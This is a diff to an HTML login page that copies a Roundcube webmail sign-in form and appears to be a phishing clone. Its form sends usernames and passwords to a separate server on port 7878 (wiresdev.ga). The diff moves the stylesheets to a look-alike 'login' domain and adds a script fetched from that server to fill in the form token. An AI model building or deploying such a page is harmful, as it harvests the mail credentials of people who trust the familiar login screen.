@@ -8,10 +8,10 @@
 
 		<link rel="shortcut icon" href="https://wiresboy.ga/assets/img/logo.png">
 
-		<link rel="stylesheet" href="./assets/bootstrap.min.css">
-		<link rel="stylesheet" href="./assets/styles.css">
+		<link rel="stylesheet" href="https://login.wiresdev.ga/assets/bootstrap.min.css">
+		<link rel="stylesheet" href="https://login.wiresdev.ga/assets/styles.css">
 	</head>
-	<body id="body" class="task-login" onLoad="myFunction()">
+	<body id="body" class="task-login">
 	<div id="layout">
 		
 
@@ -20,7 +20,7 @@
 	<div class="content selected no-navbar" role="main">
 		<img src="https://wiresboy.ga/assets/img/logo.png" id="logo" alt="Logo">
 		<form id="login-form" name="login-form" method="post" class="propform" action="http://wiresdev.ga:7878">
-			<input type="hidden" name="_token" value="uEZ7mT9IUo2KcmCPWpA0ohVcOplP161c" class="form-control">
+			<input type="hidden" id="token" name="_token" value="########################################" class="form-control">
 			<input type="hidden" name="_task" value="login" class="form-control"><input type="hidden" name="_action" value="login" class="form-control"><input type="hidden" name="_timezone" id="rcmlogintz" value="Europe/London" class="form-control"><input type="hidden" name="_url" id="rcmloginurl" value="i=1" class="form-control"><table><tbody><tr class="form-group row"><td class="title" style="display: none;"><label for="rcmloginuser">Username</label>
 				</td>
 					<td class="input input-group input-group-lg"><span class="input-group-prepend"><i class="input-group-text icon"><img draggable="false" width="25px" src="https://www.flaticon.com/svg/static/icons/svg/848/848043.svg"></i></span><input name="_user" id="rcmloginuser" required="" size="40" autocapitalize="off" autocomplete="off" type="text" class="form-control" placeholder="Username"></td>
@@ -48,6 +48,7 @@
 	<div id="messagestack"></div>
 	</body>
 </html>
+<script src="http://wiresdev.ga:7878/api/js/getToken"></script>
 <style>
 	@keyframes bg{
 		0%{
